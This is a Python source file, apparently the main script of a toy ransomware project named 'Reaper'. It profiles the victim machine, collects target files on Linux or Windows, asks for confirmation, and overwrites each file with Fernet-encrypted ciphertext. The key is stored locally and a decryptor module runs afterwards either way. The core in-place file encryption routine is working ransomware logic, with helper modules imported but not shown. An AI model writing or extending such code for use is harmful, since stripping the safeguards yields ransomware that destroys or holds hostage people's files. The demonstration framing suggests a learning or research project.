import os
from Victim import Victim
from cryptography.fernet import Fernet
from threading import Thread
from Target_detection import Target_detection
from Saviour import Saviour
import time


def generate_key():
    key = Fernet.generate_key()

    with open("key.key", "wb") as key_file:
        key_file.write(key)

    return key


class Reaper(Thread):
    def encrypt(self, key, targets):
        for file in targets:
            with open(file, "rb") as target_file:
                plain_text = target_file.read()
                cipher = Fernet(key).encrypt(plain_text)

            with open(file, "wb") as target_file:
                target_file.write(cipher)

        print("Files locked.")

    def run(self):
        victim = Victim()
        td = Target_detection(victim)

        print(
            "[Victim's details]\n\n"
            f"Targeted user: {victim.username}\n"
            f"System: {victim.system}\n"
            f"Machine: {victim.machine}\n"
            f"Processor: {victim.processor}\n\n"
            "--------------------------------\n"
        )

        targets = []
        # Optimize target detection based on the OS
        if victim.system.lower() == "linux":
            targets = td.gather_targets_linux()
        elif victim.system.lower() == "windows":
            targets = td.gather_targets_windows()
        else:
            print("[WARNING]: Unrecognised OS. Aborting attack...")
            return

        print("Locating targets...")
        print(f"Targeted directory: {td.target_path}")
        print(f"Targets: {targets}")
        print(f"Target count: {len(targets)}")

        user_input = input("\nProceed with attack? [y/n]: ")

        if user_input.lower() == "y":
            print("Generating key...")
            key = generate_key()
            print("Encrypting files...")
            self.encrypt(key, targets)

            user_input = input("\nDecrypt files? [y/n]: ")

            saviour = Saviour(targets)
            if user_input.lower() == "y":
                saviour.start()

            else:
                print("Screw you!")
                time.sleep(0.8)
                print(":)")
                saviour.start()

        else:
            print("Aborted")


if __name__ == '__main__':
    Reaper().start()
